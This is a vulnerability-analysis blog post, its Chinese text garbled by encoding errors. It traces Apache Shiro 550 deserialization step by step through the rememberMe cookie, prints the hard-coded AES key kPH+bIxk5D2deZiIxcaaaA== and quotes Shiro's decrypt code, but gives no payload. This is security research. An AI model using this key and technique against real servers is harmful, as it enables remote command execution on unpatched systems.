<h2 id="æ¼æ´åŸç†"><a href="#æ¼æ´åŸç†" class="headerlink" title="æ¼æ´åŸç†"></a>æ¼æ´åŸç†</h2><p>Shiro 550 ååºåˆ—åŒ–æ¼æ´å­˜åœ¨ç‰ˆæœ¬ï¼šshiro &lt;1.2.4ï¼Œäº§ç”ŸåŸå› æ˜¯å› ä¸ºshiroæ¥å—äº†Cookieé‡Œé¢<code>rememberMe</code>çš„å€¼ï¼Œç„¶åå»è¿›è¡ŒBase64è§£å¯†åï¼Œå†ä½¿ç”¨aeså¯†é’¥è§£å¯†åçš„æ•°æ®ï¼Œè¿›è¡Œååºåˆ—åŒ–ã€‚</p>
<p>åè¿‡æ¥æ€è€ƒä¸€ä¸‹ï¼Œå¦‚æœæˆ‘ä»¬æ„é€ è¯¥å€¼ä¸ºä¸€ä¸ªccé“¾åºåˆ—åŒ–åçš„å€¼è¿›è¡Œè¯¥å¯†é’¥aesåŠ å¯†åè¿›è¡Œbase64åŠ å¯†ï¼Œé‚£ä¹ˆè¿™æ—¶å€™å°±ä¼šå»è¿›è¡Œååºåˆ—åŒ–æˆ‘ä»¬çš„payloadå†…å®¹ï¼Œè¿™æ—¶å€™å°±å¯ä»¥è¾¾åˆ°ä¸€ä¸ªå‘½ä»¤æ‰§è¡Œçš„æ•ˆæœã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">è·å–rememberMeå€¼ -&gt; Base64è§£å¯† -&gt; AESè§£å¯† -&gt; è°ƒç”¨readobjectååºåˆ—åŒ–æ“ä½œ</span><br></pre></td></tr></table></figure>



<h3 id="åºåˆ—åŒ–è¿‡ç¨‹"><a href="#åºåˆ—åŒ–è¿‡ç¨‹" class="headerlink" title="åºåˆ—åŒ–è¿‡ç¨‹"></a>åºåˆ—åŒ–è¿‡ç¨‹</h3><p>å…ˆæ‰¾åˆ° ç¡¬ç¼–ç  key çš„ä½ç½® </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">org/apache/shiro/mgt/AbstractRememberMeManager.java</span><br></pre></td></tr></table></figure>

<p><img src="https://typora-1305076737.cos.ap-shanghai.myqcloud.com/typora_image-20211128141909881.png" alt="image-20211128141909881"></p>
<p>å‘ä¸Šæº¯æºï¼šæ‰¾åˆ°RememberMeManagerç±»çš„onSuccessfulLoginæ–¹æ³•</p>
<p>onSuccessfulLogin  :  å¤„ç†æˆåŠŸç™»å½•çš„è¿‡ç¨‹</p>
<p><img src="https://typora-1305076737.cos.ap-shanghai.myqcloud.com/typora_image-20211128142133893.png" alt="image-20211128142133893"></p>
<p>åœ¨è¿™é‡Œä¸‹ä¸€ä¸ªæ–­ç‚¹ ,  è°ƒè¯•è¿è¡Œ</p>
<p>æµè§ˆå™¨ç™»å½• , æŸ¥çœ‹ è°ƒè¯•ä¿¡æ¯</p>
<blockquote>
<p>  ps :  è®°å¾—å‹¾é€‰ rememberMe </p>
</blockquote>
<p><img src="https://typora-1305076737.cos.ap-shanghai.myqcloud.com/typora_image-20211128142417090.png" alt="image-20211128142417090"></p>
<p><strong>IDEA è°ƒè¯•ä¿¡æ¯</strong></p>
<p><img src="https://typora-1305076737.cos.ap-shanghai.myqcloud.com/typora_image-20211128142028947.png" alt="image-20211128142028947"></p>
<p>è·³è½¬è¿›å…¥ forgetIdentity å‡½æ•° , </p>
<p>ç»§ç»­è·Ÿè¿›this.forgetIdentityæ–¹æ³•ï¼Œè¿›å…¥äº†getCookieçš„removeFromæ–¹æ³•</p>
<p><img src="https://typora-1305076737.cos.ap-shanghai.myqcloud.com/typora_image-20211128144648004.png" alt="image-20211128144648004"></p>
<p>è·Ÿè¿›removeFromæ–¹æ³•</p>
<p><img src="https://typora-1305076737.cos.ap-shanghai.myqcloud.com/typora_image-20211128152117310.png" alt="image-20211128152117310"></p>
<p>è¿™é‡Œè·å–çœ‹é…ç½®ä¿¡æ¯ï¼Œæœ€å addCookieHeader æ”¾åˆ°äº†è¿”å›åŒ…ä¸­çš„cookieå¤´ä¸­ï¼Œ</p>
<p>å…¶ä¸­å°±æœ‰ç†Ÿæ‚‰çš„ deleteMe å­—æ®µå’Œ rememberMe å­—æ®µï¼Œ</p>
<p>ç»§ç»­å›åˆ° onSuccessfulLogin æ–¹æ³• , è¿™ä¸ªisRememberMeä¸»è¦æ˜¯æ£€æŸ¥é€‰æ‹©äº†remember meè¿™ä¸ªæŒ‰é’®æ²¡æœ‰</p>
<p><img src="https://typora-1305076737.cos.ap-shanghai.myqcloud.com/typora_image-20211128151657293.png" alt="image-20211128151657293"></p>
<p>åœ¨rememberIdentityæ–¹æ³•ä¸­ï¼ŒauthcInfoçš„å€¼å°±æ˜¯æˆ‘ä»¬è¾“å…¥rootç”¨æˆ·å</p>
<p><img src="https://typora-1305076737.cos.ap-shanghai.myqcloud.com/typora_image-20211128171331211.png" alt="image-20211128171331211"></p>
<p>è¿›å…¥convertPrincipalsToBytesæ–¹æ³•ï¼Œå‘ç°å®ƒä¼šåºåˆ—åŒ–ï¼Œè€Œä¸”åºåˆ—åŒ–çš„æ˜¯ä¼ å…¥çš„rootç”¨æˆ·å</p>
<p>ç„¶åå°±æ˜¯è¿›è¡Œæ™®é€šçš„åºåˆ—åŒ–æ“ä½œï¼Œå†ç„¶åè°ƒç”¨encryptoæ–¹æ³•åŠ å¯†åºåˆ—åŒ–åçš„äºŒè¿›åˆ¶å­—èŠ‚</p>
<p><img src="https://typora-1305076737.cos.ap-shanghai.myqcloud.com/typora_image-20211128194709551.png" alt="image-20211128194709551"></p>
<p>getCipherService è·å–åŠ å¯†æœåŠ¡ ï¼Œ åŠ å¯†æ–¹æ³•ä¸º <code>AES/CBC/PKCS5Padding</code></p>
<p><img src="https://typora-1305076737.cos.ap-shanghai.myqcloud.com/typora_image-20211128194925238.png" alt="image-20211128194925238"></p>
<p><code>getEncryptionCipherKey()</code> æ–¹æ³• è·å– åŠ å¯†å¯†é’¥KEY</p>
<p>ç»è¿‡ä¸€ç³»åˆ—è·³è½¬å, æ‹¿åˆ°KEY</p>
<p><img src="https://typora-1305076737.cos.ap-shanghai.myqcloud.com/typora_image-20211128200340907.png" alt="image-20211128200340907"></p>
<p>DEFAULT_CIPHER_KEY_BYTES :  <code>kPH+bIxk5D2deZiIxcaaaA==</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ByteSource byteSource = cipherService.encrypt(serialized, getEncryptionCipherKey());</span><br></pre></td></tr></table></figure>

<p>ä¼ å…¥ encrypt å‡½æ•° (root ,  â€œkPH+bIxk5D2deZiIxcaaaA&#x3D;&#x3D;â€)</p>
<p>å›åˆ° <strong>rememberIdentity</strong> æ–¹æ³•</p>
<p><img src="https://typora-1305076737.cos.ap-shanghai.myqcloud.com/typora_image-20211128202720569.png" alt="image-20211128202720569"></p>
<p>è·Ÿè¿› <strong>rememberSerializedIdentity</strong> æ–¹æ³• , è¿›è¡Œ<strong>SetCookie</strong> </p>
<p><img src="https://typora-1305076737.cos.ap-shanghai.myqcloud.com/typora_image-20211128203539827.png" alt="image-20211128203539827"></p>
<h3 id="ååºåˆ—åŒ–è¿‡ç¨‹"><a href="#ååºåˆ—åŒ–è¿‡ç¨‹" class="headerlink" title="ååºåˆ—åŒ–è¿‡ç¨‹"></a>ååºåˆ—åŒ–è¿‡ç¨‹</h3><p>åœ¨ getRememberedPrincipals æ–¹æ³•ä¸‹æ–­ç‚¹</p>
<p><img src="https://typora-1305076737.cos.ap-shanghai.myqcloud.com/typora_image-20211128211236196.png" alt="image-20211128211236196"></p>
<p>è·Ÿè¿›getRememberedSerializedIdentity æ–¹æ³• ï¼Œ è¯»å– Cookie ä¸­çš„æ•°æ®</p>
<p><img src="https://typora-1305076737.cos.ap-shanghai.myqcloud.com/typora_image-20211128211654882.png" alt="image-20211128211654882"></p>
<p>readValueæ–¹æ³•ï¼Œ è¯»å– Cookieä¸­çš„å­—æ®µ <strong>name</strong>ï¼š <code>rememberMe </code></p>
<p><img src="https://typora-1305076737.cos.ap-shanghai.myqcloud.com/typora_image-20211128212002314.png" alt="image-20211128212002314"></p>
<p>ç„¶åæŠŠCookie èµ‹å€¼ç»™ value , è¿”å›ä¸Šä¸€çº§å‡½æ•°</p>
<p><img src="https://typora-1305076737.cos.ap-shanghai.myqcloud.com/typora_image-20211128212219222.png" alt="image-20211128212219222"></p>
<p>å¯¹base64 è¿›è¡Œè§£ç </p>
<p><img src="https://typora-1305076737.cos.ap-shanghai.myqcloud.com/typora_image-20211128212320888.png" alt="image-20211128212320888"></p>
<ul>
<li>å†æ¬¡å›åˆ°AbstractRememberMeManager ç±»</li>
</ul>
<p><img src="https://typora-1305076737.cos.ap-shanghai.myqcloud.com/typora_image-20211128212553932.png" alt="image-20211128212553932"></p>
<ul>
<li>è¿›å…¥  convertBytesToPrincipals æ–¹æ³•ï¼Œè¿™å°±æ˜¯å¯¹åº”åŠ å¯†çš„è§£ææ•°æ®ï¼Œä¸­é—´è‚¯å®šè¦è§£å¯†æ•°æ®ï¼Œç»§ç»­è·Ÿå…¥</li>
</ul>
<p><img src="https://typora-1305076737.cos.ap-shanghai.myqcloud.com/typora_image-20211128183416284.png" alt="image-20211128183416284"></p>
<p>è·Ÿè¿› decrypt è§£å¯†å‡½æ•°</p>
<p><img src="https://typora-1305076737.cos.ap-shanghai.myqcloud.com/typora_image-20211128212956390.png" alt="image-20211128212956390"></p>
<p>getCipherService() è·å– åŠ è§£å¯† æ–¹æ³•,  <code>AES/CBC/PKCS5Padding </code></p>
<p><img src="https://typora-1305076737.cos.ap-shanghai.myqcloud.com/typora_image-20211128213711157.png" alt="image-20211128213711157"></p>
<p>getDecryptionCipherKey() è·å– è§£å¯†KEY ,   <code>kPH+bIxk5D2deZiIxcaaaA==</code></p>
<p>è·Ÿè¿› JcaCipherService çš„decrypt å‡½æ•°</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> ByteSource <span class="title function_">decrypt</span><span class="params">(<span class="type">byte</span>[] ciphertext, <span class="type">byte</span>[] key)</span> <span class="keyword">throws</span> CryptoException &#123;</span><br><span class="line">        <span class="type">byte</span>[] encrypted = ciphertext;</span><br><span class="line">        <span class="type">byte</span>[] iv = <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">if</span> (isGenerateInitializationVectors(<span class="literal">false</span>)) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">int</span> <span class="variable">ivSize</span> <span class="operator">=</span> getInitializationVectorSize();</span><br><span class="line">                <span class="type">int</span> <span class="variable">ivByteSize</span> <span class="operator">=</span> ivSize / BITS_PER_BYTE;</span><br><span class="line">                iv = <span class="keyword">new</span> <span class="title class_">byte</span>[ivByteSize];</span><br><span class="line">                System.arraycopy(ciphertext, <span class="number">0</span>, iv, <span class="number">0</span>, ivByteSize);</span><br><span class="line"></span><br><span class="line">                <span class="type">int</span> <span class="variable">encryptedSize</span> <span class="operator">=</span> ciphertext.length - ivByteSize;</span><br><span class="line">                encrypted = <span class="keyword">new</span> <span class="title class_">byte</span>[encryptedSize];</span><br><span class="line">                System.arraycopy(ciphertext, ivByteSize, encrypted, <span class="number">0</span>, encryptedSize);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">msg</span> <span class="operator">=</span> <span class="string">&quot;Unable to correctly extract the Initialization Vector or ciphertext.&quot;</span>;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">CryptoException</span>(msg, e);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> decrypt(encrypted, key, iv);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://typora-1305076737.cos.ap-shanghai.myqcloud.com/typora_image-20211128214031646.png" alt="image-20211128214031646"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">return</span> decrypt(encrypted, key, iv);</span><br></pre></td></tr></table></figure>

<p>è·Ÿè¿› è¿™ä¸ª decrypt å‡½æ•° , </p>
<p><img src="https://typora-1305076737.cos.ap-shanghai.myqcloud.com/typora_image-20211128214357676.png" alt="image-20211128214357676"></p>
<p>è·Ÿåˆ° JcaCipherService ä¸­çš„ crypt æ–¹æ³•</p>
<p><img src="https://typora-1305076737.cos.ap-shanghai.myqcloud.com/typora_image-20211128214448781.png" alt="image-20211128214448781"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">javax.crypto.Cipher cipher = initNewCipher(mode, key, iv, false);</span><br><span class="line">return crypt(cipher, bytes);</span><br></pre></td></tr></table></figure>

<p><code>crypt(cipher, bytes)</code> å®Œæˆè§£å¯† ,  ç„¶åè·³è½¬å›convertBytesToPrincipalså‡½æ•° , è¿›è¡Œåºåˆ—åŒ–æ“ä½œ</p>
<p><img src="https://typora-1305076737.cos.ap-shanghai.myqcloud.com/typora_image-20211128215221725.png" alt="image-20211128215221725"></p>
<p>è·Ÿè¿› deserialize() å‡½æ•°</p>
<p><img src="https://typora-1305076737.cos.ap-shanghai.myqcloud.com/typora_image-20211128215342423.png" alt="image-20211128215342423"></p>
<p>ç»§ç»­è·Ÿè¿›, èƒ½çœ‹åˆ° ç†Ÿæ‚‰çš„ ååºåˆ—åŒ–æ“ä½œ</p>
<p><img src="https://typora-1305076737.cos.ap-shanghai.myqcloud.com/typora_image-20211128215528473.png" alt="image-20211128215528473"></p>
<p>å¥½äº†, åˆ°è¿™é‡Œ , æ¼æ´åŸç†å¤ç°å°±å…¨éƒ¨ç»“æŸäº†</p>
<hr>
<h2 id="å‚è€ƒæ–‡ç« "><a href="#å‚è€ƒæ–‡ç« " class="headerlink" title="å‚è€ƒæ–‡ç« "></a>å‚è€ƒæ–‡ç« </h2><p><a href="https://xz.aliyun.com/t/8445">https://xz.aliyun.com/t/8445</a> </p>
<p><a href="https://www.jianshu.com/p/a53e5b17d7a6">https://www.jianshu.com/p/a53e5b17d7a6</a></p>
<p><a href="https://fireline.fun/2021/05/21/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90(%E4%B8%80)-Shiro550/">https://fireline.fun/2021/05/21/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90(%E4%B8%80)-Shiro550/</a></p>
<p><a href="https://zeo.cool/2020/09/03/Shiro%20550%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%20%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90+poc%E7%BC%96%E5%86%99/">https://zeo.cool/2020/09/03/Shiro%20550%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%20%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90+poc%E7%BC%96%E5%86%99/</a></p>
]]></content>
      <categories>
        <category>ç½‘ç»œå®‰å…¨</category>
        <category>æ¼æ´å¤ç°</category>
      </categories>
      <tags>
        <tag>ç½‘ç»œå®‰å…¨</tag>
        <tag>æ¼æ´å¤ç°</tag>
        <tag>Java</tag>
      </tags>
  </entry>
</search>
